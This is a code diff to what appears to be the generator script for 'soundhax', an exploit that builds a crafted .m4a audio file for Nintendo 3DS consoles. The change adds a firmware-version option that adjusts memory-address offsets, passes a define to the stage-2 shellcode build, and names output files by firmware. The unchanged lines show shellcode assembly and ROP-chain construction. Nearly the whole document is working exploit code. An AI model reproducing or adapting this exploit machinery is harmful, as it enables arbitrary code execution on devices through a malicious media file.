@@ -8,13 +8,16 @@ from os import environ, path, name as osname
 
 REGION = "usa"
 TYPE = "old" # "new"
-
+FIRM = "post5" # "pre5"
 if len(sys.argv) > 1:
     REGION = sys.argv[1].lower()
 
 if len(sys.argv) > 2:
     TYPE = sys.argv[2].lower()
 
+if len(sys.argv) > 3:
+	FIRM = sys.argv[3].lower()
+	
 for name, regions in constants.items():
     if REGION not in regions:
         print("Error: {} does not contain a constant for {}".format(REGION,
@@ -36,7 +39,7 @@ def get_arm_none_eabi_binutils_exec(name):
 def get_shellcode():
     # assemble stage 2
     call([get_arm_none_eabi_binutils_exec("gcc"), "-x", "assembler-with-cpp", "-nostartfiles",
-        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-o", "stage2.bin", "stage2.s"])
+        "-nostdlib", "-D", REGION.upper(), "-D", TYPE.upper(), "-D", FIRM.upper(), "-o", "stage2.bin", "stage2.s"])
     # generate raw instruction bytes
     call([get_arm_none_eabi_binutils_exec("objcopy"), "-O", "binary", "stage2.bin"])
     # read in the shellcode
@@ -70,18 +73,21 @@ exp += p(r2) # r2
 exp += p(r1) # r1
 
 def pa_to_gpu(pa):
-  return pa - 0x0C000000
+    return pa - 0x0C000000
 
 def gpu_to_pa(gpua):
-  return gpua + 0x0C000000
+    return gpua + 0x0C000000
 
 # 16:06:09 @yellows8 | "> readmem:11usr=CtrApp 0x002F5d00 0x100"
 # "Using physical address: 0x27bf5d00 (in_address = 0x002f5d00)"
 def code_va_to_pa(va):
-  if TYPE == "old":
-    return va + 0x23D00000
-  else:
-    return va + 0x27900000
+    if TYPE == "old":
+        if FIRM == "pre5":
+            return va + 0x23D00000 - 0x78000
+        else:
+            return va + 0x23D00000
+    else:
+        return va + 0x27900000
 
 #starts at this pop
 #.text:0027DB00 LDMFD           SP!, {R4-R10,PC}
@@ -246,7 +252,11 @@ if TYPE == "new":
     fn = './soundhax-{}-{}.m4a'.format(REGION, "n3ds")
 else:
     assert TYPE == "old"
-    fn = './soundhax-{}-{}.m4a'.format(REGION, "o3ds")
+    
+    if FIRM == "pre5":
+      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "pre5.0")
+    else :
+      fn = './soundhax-{}-{}-{}.m4a'.format(REGION, "o3ds", "post5.0")
 
 with open(fn, 'wb') as f:
   f.write(to_string(l))
